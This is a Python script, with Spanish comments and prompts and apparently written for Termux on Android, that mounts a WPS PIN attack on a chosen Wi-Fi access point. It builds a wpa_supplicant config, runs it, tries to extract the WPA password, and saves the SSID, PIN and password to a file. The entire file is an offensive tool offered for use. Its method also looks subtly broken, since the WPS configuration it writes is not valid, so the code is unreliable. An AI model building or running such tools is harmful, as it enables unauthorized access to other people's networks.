import subprocess
import re
import os
import tempfile

def run_command(command, timeout=None):
    """Ejecuta un comando de shell y captura la salida."""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        stdout, stderr = process.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
    return stdout, stderr

def create_wpa_supplicant_conf(ssid, pin):
    """Crea un archivo de configuración para wpa_supplicant."""
    conf_content = f"""
ctrl_interface=DIR=/data/misc/wifi/sockets
update_config=1

network={{
    ssid="{ssid}"
    key_mgmt=WPA-PSK
    pin="{pin}"
}}
"""
    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    conf_file.write(conf_content)
    conf_file.close()
    return conf_file.name

def try_wps_attack(interface, ssid, pin):
    """Intenta asociarse con un AP usando WPS PIN."""
    print(f"[+] Trying PIN '{pin}'...")
    conf_file = create_wpa_supplicant_conf(ssid, pin)
    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"

    command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
    stdout, stderr = run_command(command, timeout=60)

    os.remove(conf_file)  # Elimina el archivo de configuración temporal

    if "WPA PSK" in stdout or "WPA KEY" in stdout:
        password = re.search(r'WPA PSK: (.+)', stdout)
        if password:
            print(f"[+] WPA PASSWORD: {password.group(1)}")
            return password.group(1)
    else:
        print("[-] PIN failed or no response from AP.")
        return None

def main():
    # Configuración inicial
    os.system("clear")
    interface = "wlan1"
    ssid = input("Introduce el SSID del AP objetivo: ")
    pin = input("Introduce el PIN WPS: ")

    # Intentar el ataque WPS
    print(f"Iniciando ataque WPS en SSID: {ssid}")
    password = try_wps_attack(interface, ssid, pin)

    if password:
        print("\n[+] ¡Ataque exitoso!")
        print(f"[+] SSID: {ssid}")
        print(f"[+] PIN: {pin}")
        print(f"[+] Contraseña: {password}")
        with open("wifi_result.txt", "w") as result_file:
            result_file.write(f"SSID: {ssid}\nPIN: {pin}\nContraseña: {password}\n")
        print("[+] Información guardada en wifi_result.txt")
    else:
        print("[-] El ataque falló. Intenta con otro PIN.")

if __name__ == "__main__":
    main()
